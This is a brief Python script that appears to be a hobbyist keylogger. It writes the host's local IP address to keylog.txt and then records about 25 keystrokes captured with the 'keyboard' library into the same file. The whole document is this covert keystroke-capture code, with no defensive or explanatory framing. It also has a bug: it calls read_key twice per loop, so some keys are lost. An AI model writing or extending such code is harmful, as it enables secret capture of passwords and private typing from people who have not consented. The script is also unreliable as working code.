import keyboard
import socket

with open("keylog.txt", "w") as f:
    f.write("IP:  ")
    f.write(socket.gethostbyname(socket.gethostname()))
    f.write("\n")
    f.write("_____________________________________________________")
    f.write("\n")

    alfabetet = []


    for i in range(25):
        if keyboard.read_key() == "space":
            alfabetet.append(" ")
        else:
            alfabetet.append(keyboard.read_key())

    for i in alfabetet:
        f.write(i)


